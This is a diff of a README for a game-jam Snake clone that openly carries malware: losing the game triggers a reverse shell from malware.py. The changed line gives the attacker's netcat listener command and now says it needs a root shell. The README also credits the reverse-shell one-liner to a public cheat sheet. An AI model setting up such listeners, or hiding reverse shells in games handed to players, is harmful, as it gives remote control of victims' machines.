@@ -6,7 +6,7 @@ It is a common Snake Game clone, but, when you loose the game, it punishes you b
 
 All malware code is located in `malware.py`, and all game code in `main.py`.  
 The game is built with [Pygame](https://www.pygame.org/wiki/about).  
-NetCat listener command: `stty raw -echo; (stty size; cat) | nc -lvnp 666`. For some reason it only works on a bash shell, `sudo command` won't do.  
+NetCat listener command: `stty raw -echo; (stty size; cat) | nc -lvnp 666`. For some reason it only works on a root shell, `sudo command` won't do.  
 The reverse-shell one-liner is not from my authorship, check it [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#c).  
 
 This program was built for a Coding Jam, please ignore any bad or spaghetti code.  
